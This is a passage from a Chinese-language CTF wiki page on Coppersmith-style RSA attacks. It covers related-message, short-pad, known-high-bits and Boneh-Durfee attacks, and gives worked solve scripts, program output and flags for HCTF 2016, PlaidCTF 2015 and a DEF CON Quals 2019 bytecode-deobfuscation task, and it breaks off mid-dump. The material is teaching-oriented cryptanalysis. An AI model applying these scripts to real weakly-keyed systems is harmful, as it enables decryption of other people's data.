PR.<x>=PolynomialRing(Zmod(n))\n    g1 = x^e - c1\n    g2 = (x+b)^e - c2\n\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nc1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L\nc2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08L\nn = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553\ne=3\na = 1\nid1 = 1002\nid2 = 2614\nb = id2 - id1\nm1 = attack(c1,c2, b,e,n)\nprint binascii.unhexlify(\"%x\" % int(m1 - id1))\n```\n\n结果如下\n\n```shell\n➜  sctf-rsa3-level3 git:(master) ✗ sage exp.sage\nsys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it.\nUntrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory\nF4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL\n```\n\n### 题目\n\n- hitcon 2014 rsaha\n- N1CTF 2018 rsa_padding\n\n## Coppersmith’s short-pad attack\n\n### 攻击条件\n\n目前在大部分消息加密之前都会进行 padding，但是如果 padding 的长度过短，也有**可能**被很容易地攻击。\n\n这里所谓 padding 过短，其实就是对应的多项式的根会过小。\n\n### 攻击原理\n\n我们假设爱丽丝要给鲍勃发送消息，首先爱丽丝对要加密的消息 M 进行随机 padding，然后加密得到密文 C1，发送给鲍勃。这时，中间人皮特截获了密文。一段时间后，爱丽丝没有收到鲍勃的回复，再次对要加密的消息 M 进行随机 padding，然后加密得到密文 C2，发送给 Bob。皮特再一次截获。这时，皮特就**可能**可以利用如下原理解密。\n\n这里我们假设模数 N 的长度为 k，并且 padding 的长度为 $m=\\lfloor \\frac{k}{e^2} \\rfloor$。此外，假设要加密的消息的长度最多为 k-m 比特，padding 的方式如下\n\n$$\nM_1=2^mM+r_1, 0\\leq r_1\\leq 2^m\n$$\n\n消息 M2 的 padding 方式类似。\n\n那么我们可以利用如下的方式来解密。\n\n首先定义\n\n$$\ng_1(x,y)=x^e-C_1\ng_2(x,y)=(x+y)^e-C_2\n$$\n\n其中 $y=r_2-r_1$。显然这两个方程具有相同的根 M1。然后还有一系列的推导。\n\n## Known High Bits Message Attack\n\n### 攻击条件\n\n这里我们假设我们首先加密了消息 m，如下\n\n$$\nC\\equiv m^d \\bmod N\n$$\n\n并且我们假设我们知道消息 m 的很大的一部分 $m_0$，即 $m=m_0+x$，但是我们不知道 $x$。那么我们就有可能通过该方法进行恢复消息。这里我们不知道的 x 其实就是多项式的根，需要满足 Coppersmith 的约束。\n\n可以参考 https://github.com/mimoo/RSA-and-LLL-attacks。\n\n## Factoring with High Bits Known\n\n### 攻击条件\n\n当我们知道一个公钥中模数 N 的一个因子的较高位时，我们就有一定几率来分解 N。\n\n### 攻击工具\n\n请参考 https://github.com/mimoo/RSA-and-LLL-attacks。上面有使用教程。关注下面的代码\n\n```python\nbeta = 0.5\ndd = f.degree()\nepsilon = beta / 7\nmm = ceil(beta**2 / (dd * epsilon))\ntt = floor(dd * mm * ((1/beta) - 1))\nXX = ceil(N**((beta**2/dd) - epsilon)) + 1000000000000000000000000000000000\nroots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)\n```\n\n其中，\n\n- 必须满足 $q\\geq N^{beta}$，所以这里给出了$beta=0.5$，显然两个因数中必然有一个是大于的。\n- XX 是 $f(x)=q'+x$ 在模 q 意义下的根的上界，自然我们可以选择调整它，这里其实也表明了我们已知的 $q'$ 与因数 q 之间可能的差距。\n\n### 2016 HCTF RSA2\n\n这里我们以 2016 年 HCTF 中的 RSA2 为例进行介绍。\n\n首先程序的开头是一个绕过验证的，绕过即可，代码如下\n\n```python\nfrom pwn import *\nfrom hashlib import sha512\nsh = remote('127.0.0.1', 9999)\ncontext.log_level = 'debug'\ndef sha512_proof(prefix, verify):\n    i = 0\n    pading = \"\"\n    while True:\n        try:\n            i = randint(0, 1000)\n            pading += str(i)\n            if len(pading) > 200:\n                pading = pading[200:]\n            #print pading\n        except StopIteration:\n            break\n        r = sha512(prefix + pading).hexdigest()\n        if verify in r:\n            return pading\n\n\ndef verify():\n    sh.recvuntil(\"Prefix: \")\n    prefix = sh.recvline()\n    print len(prefix)\n    prefix = prefix[:-1]\n    prefix = prefix.decode('base64')\n    proof = sha512_proof(prefix, \"fffffff\")\n    sh.send(proof.encode('base64'))\nif __name__ == '__main__':\n    verify()\n    print 'verify success'\n    sh.recvuntil(\"token: \")\n    token = \"5c9597f3c8245907ea71a89d9d39d08e\"\n    sh.sendline(token)\n\n    sh.recvuntil(\"n: \")\n    n = sh.readline().strip()\n    n = int(n[2:], 16)\n\n    sh.recvuntil(\"e: \")\n    e = sh.readline().strip()\n    e = int(e[2:], 16)\n\n    sh.recvuntil(\"e2: \")\n    e2 = sh.readline().strip()\n    e2 = int(e2[2:], 16)\n\n    sh.recvuntil(\"is: \")\n    enc_flag = sh.readline().strip()\n    enc_flag = int(enc_flag[2:-1], 16)\n    print \"n: \", hex(n)\n    print \"e: \", hex(e)\n    print \"e2: \", hex(e2)\n    print \"flag: \", hex(enc_flag)\n```\n\n这里我们也已经得到 n，e，e2，加密后的 flag 了，如下\n\n```python\nn:  0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\ne:  0x10001\ne2:  0xf93b\nflag:  0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8\n```\n\n接下来我们来分析主程序。可以看出\n\n```python\n\tp, q, e = gen_key()\n\tn = p * q\n\tphi_n = (p-1)*(q-1)\n\td = invmod(e, phi_n)\n\twhile True:\n\t\te2 = random.randint(0x1000, 0x10000)\n\t\tif gcd(e2, phi_n) == 1:\n\t\t\tbreak\n```\n\n我们得到的 $n=p \\times q$。而 p，q 以及我们已知的 e 都在 `gen_key` 函数中生成。看一看 `gen_key` 函数\n\n```python\ndef gen_key():\n\twhile True:\n\t\tp = getPrime(k/2)\n\t\tif gcd(e, p-1) == 1:\n\t\t\tbreak\n\tq_t = getPrime(k/2)\n\tn_t = p * q_t\n\tt = get_bit(n_t, k/16, 1)\n\ty = get_bit(n_t, 5*k/8, 0)\n\tp4 = get_bit(p, 5*k/16, 1)\n\tu = pi_b(p4, 1)\n\tn = bytes_to_long(long_to_bytes(t) + long_to_bytes(u) + long_to_bytes(y))\n\tq = n / p\n\tif q % 2 == 0:\n\t\tq += 1\n\twhile True:\n\t\tif isPrime(q) and gcd(e, q-1) == 1:\n\t\t\tbreak\n\t\tm = getPrime(k/16) + 1\n\t\tq ^= m\n\treturn (p, q, e)\n```\n\n其中我们已知如下参数\n\n$$\nk=2048\ne=0x10001\n$$\n\n首先，程序先得到了 1024 比特位的素数 p，并且 `gcd(2,p-1)=1`。\n\n然后，程序又得到了一个 1024 比特位的素数 $q_t$，并且计算 $n_t=p \\times q_t$。\n\n下面多次调用了 `get_bit` 函数，我们来简单分析一下\n\n```python\ndef get_bit(number, n_bit, dire):\n\t'''\n\tdire:\n\t\t1: left\n\t\t0: right\n\t'''\n\n\tif dire:\n\t\tsn = size(number)\n\t\tif sn % 8 != 0:\n\t\t\tsn += (8 - sn % 8)\n\t\treturn number >> (sn-n_bit)\n\telse:\n\t\treturn number & (pow(2, n_bit) - 1)\n```\n\n可以看出根据 `dire(ction)` 的不同，会得到不同的数\n\n- `dire=1` 时，程序首先计算 `number` 的二进制位数 `sn`，如果不是 8 的整数倍的话，就将 `sn` 增大为 8 的整数倍，然后返回 `number` 右移 `sn-n_bit` 的数字。其实 就是最多保留 `number` 的 `n_bit` 位。\n- `dire=0` 时，程序直接获取 `number` 的低 `n_bit` 位。\n\n然后我们再来看程序\n\n```python\n\tt = get_bit(n_t, k/16, 1)\n\ty = get_bit(n_t, 5*k/8, 0)\n\tp4 = get_bit(p, 5*k/16, 1)\n```\n\n这三个操作分别做了如下的事情\n\n- `t` 为 `n_t` 的最多高 k/16 位，即 128 位，位数不固定。\n- `y` 为 `n_t` 的低 5*k/8 位，即 1280 位，位数固定。\n- `p4` 为 p 的最多高 5*k/16 位，即 640 位，位数不固定。\n\n此后，程序有如下操作\n\n```python\n\tu = pi_b(p4, 1)\n```\n\n利用 `pi_b` 对 `p4` 进行了加密\n\n```python\ndef pi_b(x, m):\n\t'''\n\tm:\n\t\t1: encrypt\n\t\t0: decrypt\n\t'''\n\tenc = DES.new(key)\n\tif m:\n\t\tmethod = enc.encrypt\n\telse:\n\t\tmethod = enc.decrypt\n\ts = long_to_bytes(x)\n\tsp = [s[a:a+8] for a in xrange(0, len(s), 8)]\n\tr = \"\"\n\tfor a in sp:\n\t\tr += method(a)\n\treturn bytes_to_long(r)\n```\n\n其中，我们已知了密钥 key，所以只要我们有密文就可以解密。此外，可以看到的是程序是对传入的消息进行 8 字节分组，采用密码本方式加密，所以密文之间互不影响。\n\n下面\n\n```python\n\tn = bytes_to_long(long_to_bytes(t) + long_to_bytes(u) + long_to_bytes(y))\n\tq = n / p\n\tif q % 2 == 0:\n\t\tq += 1\n\twhile True:\n\t\tif isPrime(q) and gcd(e, q-1) == 1:\n\t\t\tbreak\n\t\tm = getPrime(k/16) + 1\n\t\tq ^= m\n\treturn (p, q, e)\n```\n\n程序将 t，u，y 拼接在一起得到 n，进而，程序得到了 q，并对 q 的低 k/16 位做了抑或，然后返回 `q'`。\n\n在主程序里，再一次得到了 `n'=p*q'`。这里我们仔细分析一下\n\n```\nn'=p * ( q + random(2^{k/16}))\n```\n\n而 p 是 k/2 位的，所以说，random 的部分最多可以影响原来的 n 的最低的 $k/2+k/16=9k/16$ 比特位。\n\n而，我们还知道 n 的最低的 5k/8=10k/16 比特为其实就是 y，所以其并没有影响到 u，即使影响到也就最多影响到一位。\n\n所以我们首先可以利用我们得到的 n 来获取 u，如下\n\n```\nu=hex(n)[2:-1][-480:-320]\n```\n\n虽然，这样可能会获得较多位数的 u，但是这样并不影响，我们对 u 解密的时候每一分组都互不影响，所以我们只可能影响最高位数的 p4。而 p4 的的高 8 位也有可能是填充的。但这也并不影响，我们已经得到了因子 p 的的很多部分了，我们可以去尝试着解密了。如下\n\n```python\nif __name__==\"__main__\":\n\tn = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\n\tu = hex(n)[2:-1][-480:-320]\n\tu = int(u,16)\n\tp4 = pi_b(u,0)\n\tprint hex(p4)\n```\n\n解密结果如下\n\n```python\n➜  2016-HCTF-RSA2 git:(master) ✗ python exp_p4.py\n0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693L\n```\n\n下面，我们直接使用 sage 来解密，这里 sage 里面已经实现了这个攻击，我们直接拿来用就好\n\n```python\nfrom sage.all import *\nimport binascii\nn = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\np4 =0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693\ncipher = 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8\ne2 = 0xf93b\npbits = 1024\nkbits = pbits - p4.nbits()\nprint p4.nbits()\np4 = p4 << kbits\nPR.<x> = PolynomialRing(Zmod(n))\nf = x + p4\nroots = f.small_roots(X=2^kbits, beta=0.4)\nif roots:\n    p = p4+int(roots[0])\n    print \"p: \", hex(int(p))\n    assert n % p == 0\n    q = n/int(p)\n    print \"q: \", hex(int(q))\n    print gcd(p,q)\n    phin = (p-1)*(q-1)\n    print gcd(e2,phin)\n    d = inverse_mod(e2,phin)\n    flag = pow(cipher,d,n)\n    flag = hex(int(flag))[2:-1]\n    print binascii.unhexlify(flag)\n```\n\n关于 `small_roots` 的使用，可以参考 [SAGE 说明](http://doc.sagemath.org/html/en/reference/polynomial_rings/sage/rings/polynomial/polynomial_modn_dense_ntl.html#sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots)。\n\n结果如下\n\n```shell\n➜  2016-HCTF-RSA2 git:(master) ✗ sage payload.sage\nsys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it.\nUntrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory\n640\np:  0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde13626933aa6762057e1df53d27356ee6a09b17ef4f4986d862e3bb24f99446a0ab2385228295f4b776c1f391ab2a0d8c0dec1e5L\nq:  0xb306030a7c6ace771db8adb45fae597f3c1be739d79fd39dfa6fd7f8c177e99eb29f0462c3f023e0530b545df6e656dadb984953c265b26f860b68aa6d304fa403b0b0e37183008592ec2a333c431e2906c9859d7cbc4386ef4c4407ead946d855ecd6a8b2067ad8a99b21111b26905fcf0d53a1b893547b46c3142b06061853L\n1\n1\nhctf{d8e8fca2dc0f896fd7cb4cb0031ba249}\n```\n\n### 题目\n\n- 2016 湖湘杯 简单的 RSA\n- 2017 WHCTF Untitled\n\n## Boneh and Durfee attack\n\n### 攻击条件\n\n当 d 较小时，满足 $d < N^{0.292}$ 时，我们可以利用该攻击，比 Wiener's Attack 要强一些。\n\n### 攻击原理\n\n这里简单说一下原理。\n\n首先\n\n$$\ned \\equiv 1 \\bmod  \\varphi(N)/2\n$$\n\n进而有\n\n$$\ned +k\\varphi(N)/2=1\n$$\n\n即\n\n$$\nk \\varphi(N)/2 \\equiv 1 \\bmod e\n$$\n\n\n又\n\n$$\n\\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1\n$$\n\n所以\n\n$$\nk(N-p-q+1)/2 \\equiv 1 \\bmod e\n$$\n\n假设 $A=\\frac{N+1}{2}$，$y=\\frac{-p-q}{2}$ ，原式可化为\n\n$$\nf(k,y)=k(A+y) \\equiv 1 \\bmod e\n$$\n\n其中\n\n$|k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta}$\n\n$|y|<2*N^{0.5}$\n\ny 的估计用到了 p、q 比较均匀的假设。这里 delta 为预估的小于 0.292 的值。\n\n如果我们求得了该二元方程的根，那么我们自然也就可以解一元二次方程 $N=pq,p+q=-2y$ 来得到 p 与 q。\n\n更加具体的推导，参考 New Results on the Cryptanalysis of Low Exponent RSA.\n\n### 攻击工具\n\n请参考 https://github.com/mimoo/RSA-and-LLL-attacks 。上面有使用教程。\n\n### 2015 PlaidCTF Curious\n\n这里我们以 2015 年 PlaidCTF Curious 为例进行介绍。\n\n首先题目给了一堆 N，e，c。简单看一下可以发现该 e 比较大。这时候我们可以考虑使用 Wiener's Attack，这里我们使用更强的目前介绍的攻击。\n\n核心代码如下\n\n```python\n    nlist = list()\n    elist = list()\n    clist = list()\n    with open('captured') as f:\n        # read the line {N : e : c} and do nothing with it\n        f.readline()\n        for i in f.readlines():\n            (N, e, c) = i[1:-2].split(\" : \")\n            nlist.append(long(N,16))\n            elist.append(long(e,16))\n            clist.append(long(c,16))\n\n    for i in range(len(nlist)):\n        print 'index i'\n        n = nlist[i]\n        e = elist[i]\n        c = clist[i]\n        d = solve(n,e)\n        if d==0:\n            continue\n        else:\n            m = power_mod(c, d, n)\n            hex_string = \"%x\" % m\n            import binascii\n            print \"the plaintext:\", binascii.unhexlify(hex_string)\n            return\n```\n\n结果如下\n\n```shell\n=== solution found ===\nprivate key found: 23974584842546960047080386914966001070087596246662608796022581200084145416583\nthe plaintext: flag_S0Y0UKN0WW13N3R$4TT4CK!\n```\n\n### 2019 Defcon Quals ASRybaB\n\n题目大概意思是，我们接收三对 RSA ，然后需要求出 d，然后对给定的数字 v[i] 加密，发送给服务器，只要时间在一定范围内，940s，即可。那难点自然在 create_key 函数了。\n\n```python\ndef send_challenges():\n\n    code = marshal.loads(\"63000000000d000000070000004300000073df010000740000721d0064010064020015000000000100640200157d00006e00007401007d01007c0100640300157d02006402007d0300786f007c03006a02008300007c01006b030072a400784c007403007296007404006a05007c02008301007d04007404006a05007c02008301007d05007406007c04007c0500188301006a02008300007c0100640400146b0400724b0050714b00714b00577c04007c0500147d0300713600577c0400640500187c050064050018147d06006406007d07006407007d080078090174030072ce017404006a07007408006403007409007c01007c0700148301008302007408006403007409007c01007c070014830100640500178302008302007d09007871007c09006a02008300007c01007c0800146b0000727b016402007d0a007844007404006a0a007c0a00830100736d017404006a0700740800640300640800830200740800640300640800830200740800640300640900830200178302007d0a00712a01577c09007c0a00397d0900710b01577404006a0b007c09007c06008302006405006b0300729a0171c6006e00007404006a0c007c09007c06008302007d0b007404006a0b007c0b007c06008302006405006b030072ca0171c6006e00005071c60057640a007d0c007c03007c0b0066020053280b0000004e690700000069000000006902000000675839b4c876bedf3f6901000000674e62105839b4d03f678d976e1283c0d23f692d000000690c0000006903000000280d000000740500000046616c736574050000004e53495a45740a0000006269745f6c656e67746874040000005472756574060000006e756d626572740e0000006765745374726f6e675072696d657403000000616273740e00000067657452616e646f6d52616e67657403000000706f777403000000696e74740700000069735072696d6574030000004743447407000000696e7665727365280d00000074010000007874050000004e73697a657406000000707173697a6574010000004e740100000070740100000071740300000070686974060000006c696d69743174060000006c696d697432740100000064740300000070707074010000006574030000007a7a7a2800000000280000000073150000002f6f726967696e616c6368616c6c656e67652e7079740a0000006372656174655f6b657917000000733e000000000106010a010d0206010a010601150109010f010f04200108010e0112020601060109013c0119010601120135020e011801060112011801060105020604\".decode(\"hex\"))\n    create_key = types.FunctionType(code, globals(), \"create_key\")\n    \n    ck = create_key\n```\n\n我们可以简单看看这个到底是在干啥\n\n```python\n>>> import marshal\n>>> data=\"63000000000d000000070000004300000073df010000740000721d0064010064020015000000000100640200157d00006e00007401007d01007c0100640300157d02006402007d0300786f007c03006a02008300007c01006b030072a400784c007403007296007404006a05007c02008301007d04007404006a05007c02008301007d05007406007c04007c0500188301006a02008300007c0100640400146b0400724b0050714b00714b00577c04007c0500147d0300713600577c0400640500187c050064050018147d06006406007d07006407007d080078090174030072ce017404006a07007408006403007409007c01007c0700148301008302007408006403007409007c01007c070014830100640500178302008302007d09007871007c09006a02008300007c01007c0800146b0000727b016402007d0a007844007404006a0a007c0a00830100736d017404006a0700740800640300640800830200740800640300640800830200740800640300640900830200178302007d0a00712a01577c09007c0a00397d0900710b01577404006a0b007c09007c06008302006405006b0300729a0171c6006e00007404006a0c007c09007c06008302007d0b007404006a0b007c0b007c06008302006405006b030072ca0171c6006e00005071c60057640a007d0c007c03007c0b0066020053280b0000004e690700000069000000006902000000675839b4c876bedf3f6901000000674e62105839b4d03f678d976e1283c0d23f692d000000690c0000006903000000280d000000740500000046616c736574050000004e53495a45740a0000006269745f6c656e67746874040000005472756574060000006e756d626572740e0000006765745374726f6e675072696d657403000000616273740e00000067657452616e646f6d52616e67657403000000706f777403000000696e74740700000069735072696d6574030000004743447407000000696e7665727365280d00000074010000007874050000004e73697a657406000000707173697a6574010000004e740100000070740100000071740300000070686974060000006c696d69743174060000006c696d697432740100000064740300000070707074010000006574030000007a7a7a2800000000280000000073150000002f6f726967696e616c6368616c6c656e67652e7079740a0000006372656174655f6b657917000000733e000000000106010a010d0206010a010601150109010f010f04200108010e0112020601060109013c0119010601120135020e011801060112011801060105020604\"\n>>> code=marshal.loads(data)\n>>> code=marshal.loads(data.decode('hex'))\n>>> import dis\n>>> dis.dis(code)\n 24           0 LOAD_GLOBAL              0 (False)\n              3 POP_JUMP_IF_FALSE       29\n\n 25           6 LOAD_CONST               1 (7)\n              9 LOAD_CONST               2 (0)\n             12 BINARY_DIVIDE\n             13 STOP_CODE\n             14 STOP_CODE\n             15 STOP_CODE\n...\n 56         428 LOAD_GLOBAL              4 (number)\n            431 LOAD_ATTR               11 (GCD)\n            434 LOAD_FAST               11 (e)\n            437 LOAD_FAST                6 (phi)\n            440 CALL_FUNCTION            2\n            443 LOAD_CONST               5 (1)\n            446 COMPARE_OP               3 (!=)\n            449 POP_JUMP_IF_FALSE      458\n...\n```\n\n基本可以猜出来这是在生成 n，e，d，其实和我们最初的预期也差不多。我们来直接反编译一下\n\n```python\n>>> from uncompyle6 import code_deparse\n>>> code_deparse(code)\nInstruction context:\n\n  25       6  LOAD_CONST            1  7\n              9  LOAD_CONST            2  0\n             12  BINARY_DIVIDE\n->           13  STOP_CODE\n             14  STOP_CODE\n             15  STOP_CODE\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/usr/local/lib/python2.7/site-packages/uncompyle6/semantics/pysource.py\", line 2310, in code_deparse\n    deparsed.ast = deparsed.build_ast(tokens, customize, isTopLevel=isTopLevel)\n  File \"/usr/local/lib/python2.7/site-packages/uncompyle6/semantics/pysource.py\", line 2244, in build_ast\n    raise ParserError(e, tokens)\nuncompyle6.semantics.parser_error.ParserError: --- This code section failed: ---\n...\n 64     469  LOAD_FAST             3  'N'\n         472  LOAD_FAST            11  'e'\n         475  BUILD_TUPLE_2         2  None\n         478  RETURN_VALUE\n          -1  RETURN_LAST\n\nParse error at or near `STOP_CODE' instruction at offset 13\n```\n\n可以发现 STOP_CODE，有点猫腻，如果仔细看最初的反汇编的话，我们可以发现最前面的那部分代码是在混淆\n\n```python\n>>> dis.dis(code)\n 24           0 LOAD_GLOBAL              0 (False)\n              3 POP_JUMP_IF_FALSE       29\n\n 25           6 LOAD_CONST               1 (7)\n              9 LOAD_CONST               2 (0)\n             12 BINARY_DIVIDE\n             13 STOP_CODE\n             14 STOP_CODE\n             15 STOP_CODE\n\n 26          16 STOP_CODE\n             17 POP_TOP\n             18 STOP_CODE\n             19 LOAD_CONST               2 (0)\n             22 BINARY_DIVIDE\n             23 STORE_FAST               0 (x)\n             26 JUMP_FORWARD             0 (to 29)\n\n 28     >>   29 LOAD_GLOBAL              1 (NSIZE)\n             32 STORE_FAST               1 (Nsize)\n\n 29          35 LOAD_FAST                1 (Nsize)\n             38 LOAD_CONST               3 (2)\n             41 BINARY_DIVIDE\n             42 STORE_FAST               2 (pqsize)\n```\n\n一直到\n\n```python\n 29          35 LOAD_FAST                1 (Nsize)\n```\n\n前面的都没有什么作用，感觉是出题者故意修改了代码。仔细分析一下这部分代码，感觉像是两部分\n\n```python\n# part 1\n 25           6 LOAD_CONST               1 (7)\n              9 LOAD_CONST               2 (0)\n             12 BINARY_DIVIDE\n             13 STOP_CODE\n             14 STOP_CODE\n             15 STOP_CODE\n# part 2\n 26          16 STOP_CODE\n             17 POP_TOP\n             18 STOP_CODE\n             19 LOAD_CONST               2 (0)\n             22 BINARY_DIVIDE\n             23 STORE_FAST               0 (x)\n             26 JUMP_FORWARD             0 (to 29)\n```\n\n正好是第 25 行和第 26 行，大概猜一猜，感觉两个都是 x=7/0，所以就想办法把这部分的代码修复一下，接下来就是定位这部分代码了。根据手册可以知道 STOP_CODE 是 0，从而我们可以定位第 25 行语句到 26 行语句为 t[6:26]，他们分别都是 10 字节(6-15,16-25)。\n\n```python\n>>> t=code.co_code\n>>> t\n't\\x00\\x00r\\x1d\\x00d\\x01\\x00d\\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00d\\x02\\x00\\x15}\\x00\\x00n\\x00\\x00t\\x01\\x00}\\x01\\x00|\\x01\\x00d\\x03\\x00\\x15}\\x02\\x00d\\x02\\x00}\\x03\\x00xo\\x00|\\x03\\x00j\\x02\\x00\\x83\\x00\\x00|\\x01\\x00k\\x03\\x00r\\xa4\\x00xL\\x00t\\x03\\x00r\\x96\\x00t\\x04\\x00j\\x05\\x00|\\x02\\x00\\x83\\x01\\x00}\\x04\\x00t\\x04\\x00j\\x05\\x00|\\x02\\x00\\x83\\x01\\x00}\\x05\\x00t\\x06\\x00|\\x04\\x00|\\x05\\x00\\x18\\x83\\x01\\x00j\\x02\\x00\\x83\\x00\\x00|\\x01\\x00d\\x04\\x00\\x14k\\x04\\x00rK\\x00PqK\\x00qK\\x00W|\\x04\\x00|\\x05\\x00\\x14}\\x03\\x00q6\\x00W|\\x04\\x00d\\x05\\x00\\x18|\\x05\\x00d\\x05\\x00\\x18\\x14}\\x06\\x00d\\x06\\x00}\\x07\\x00d\\x07\\x00}\\x08\\x00x\\t\\x01t\\x03\\x00r\\xce\\x01t\\x04\\x00j\\x07\\x00t\\x08\\x00d\\x03\\x00t\\t\\x00|\\x01\\x00|\\x07\\x00\\x14\\x83\\x01\\x00\\x83\\x02\\x00t\\x08\\x00d\\x03\\x00t\\t\\x00|\\x01\\x00|\\x07\\x00\\x14\\x83\\x01\\x00d\\x05\\x00\\x17\\x83\\x02\\x00\\x83\\x02\\x00}\\t\\x00xq\\x00|\\t\\x00j\\x02\\x00\\x83\\x00\\x00|\\x01\\x00|\\x08\\x00\\x14k\\x00\\x00r{\\x01d\\x02\\x00}\\n\\x00xD\\x00t\\x04\\x00j\\n\\x00|\\n\\x00\\x83\\x01\\x00sm\\x01t\\x04\\x00j\\x07\\x00t\\x08\\x00d\\x03\\x00d\\x08\\x00\\x83\\x02\\x00t\\x08\\x00d\\x03\\x00d\\x08\\x00\\x83\\x02\\x00t\\x08\\x00d\\x03\\x00d\\t\\x00\\x83\\x02\\x00\\x17\\x83\\x02\\x00}\\n\\x00q*\\x01W|\\t\\x00|\\n\\x009}\\t\\x00q\\x0b\\x01Wt\\x04\\x00j\\x0b\\x00|\\t\\x00|\\x06\\x00\\x83\\x02\\x00d\\x05\\x00k\\x03\\x00r\\x9a\\x01q\\xc6\\x00n\\